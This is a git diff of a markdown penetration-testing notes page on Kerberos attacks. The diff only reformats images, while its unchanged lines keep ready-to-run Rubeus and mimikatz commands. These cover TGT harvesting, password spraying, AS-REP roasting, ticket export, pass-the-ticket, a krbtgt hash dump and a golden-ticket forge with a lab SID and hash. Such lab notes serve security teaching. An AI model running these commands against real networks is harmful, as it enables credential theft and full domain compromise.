@@ -23,7 +23,11 @@ Common Terminology
 Working of Kerberos is simple. AS is responsible for verifying if the user actually has an account on the domain and TGS is responsible for generating the session key for the valid user. \
 **SCENARIO:** A valid user wants to access SQL account for maintenance. This happens like following
 
-![](<../../.gitbook/assets/image (28).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (28).png" alt="">
+
+</div>
 
 STEP 1 => AS-REQ (Authentication Service REQuest) => A user requests TGT from AS (Authentication Service) so that user can ask for a session key from TGS.\
 **WHAT DOES THIS REQUEST CONTAIN?** The user encrypts the timestamp with his NT hash (password hash). AS then tries to decrypt and retrieve the timestamp using the NT hash stored in it's database (Since, KDC is the domain admin it has stored passwords of all domain accounts). IF the timestamp is a match, it then issues the TGT
@@ -62,7 +66,11 @@ Download Kerberute [here](https://github.com/ropnop/kerbrute/releases).
 
 Here, User.txt is the dictionary containing most common account names. This can be dowloaded [here](https://github.com/jeanphorn/wordlist/blob/master/usernames.txt).
 
-![](<../../.gitbook/assets/image (131).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (131).png" alt="">
+
+</div>
 
 ## Harvesting TGT (Tickets) with Rubeus
 
@@ -72,11 +80,19 @@ Download rubeus [here](https://github.com/GhostPack/Rubeus).
 
 `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds
 
-![](<../../.gitbook/assets/image (156) (1).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (156) (1).png" alt="">
+
+</div>
 
 `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user.
 
-![](<../../.gitbook/assets/image (10) (1).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (10) (1).png" alt="">
+
+</div>
 
 ## Kerberoasting
 
@@ -100,7 +116,11 @@ During pre-authentication, the users hash will be used to encrypt a timestamp th
 
 `Rubeus.exe asreproast`
 
-![](<../../.gitbook/assets/image (95).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (95).png" alt="">
+
+</div>
 
 Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
 
@@ -116,23 +136,43 @@ mimikatz.exe&#x20;
 
 privilege::debug
 
-![](<../../.gitbook/assets/image (79).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (79).png" alt="">
+
+</div>
 
 sekurlsa::tickets /export
 
-![](<../../.gitbook/assets/image (27).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (27).png" alt="">
+
+</div>
 
 kerberos::ptt
 
-![](<../../.gitbook/assets/image (115).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (115).png" alt="">
+
+</div>
 
 klist
 
-![](<../../.gitbook/assets/image (80).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (80).png" alt="">
+
+</div>
 
 You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
 
-![](<../../.gitbook/assets/image (155).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (155).png" alt="">
+
+</div>
 
 ## Golden and SIlver Ticket Attacks
 
@@ -147,16 +187,24 @@ In order to fully understand how these attacks work you need to understand what 
 **Dump the krbtgt hash**
 
 `cd downloads && mimikatz.exe` \
-**``**`privilege::debug` \
+`privilege::debug` \
 `lsadump::lsa /inject /name:krbtgt`
 
-![](<../../.gitbook/assets/image (26).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (26).png" alt="">
+
+</div>
 
 Generate golden ticket:
 
 **`Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:1103`**
 
-![](<../../.gitbook/assets/image (126) (1).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (126) (1).png" alt="">
+
+</div>
 
 ### Use the Golden/Silver Ticket to access other machines
 
@@ -164,7 +212,11 @@ misc::cmd
 
 Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
 
-![](<../../.gitbook/assets/image (75).png>)
+<div align="left">
+
+<img src="../../.gitbook/assets/image (75).png" alt="">
+
+</div>
 
 ## **Kerberos Skeleton (Backdoor)**
 
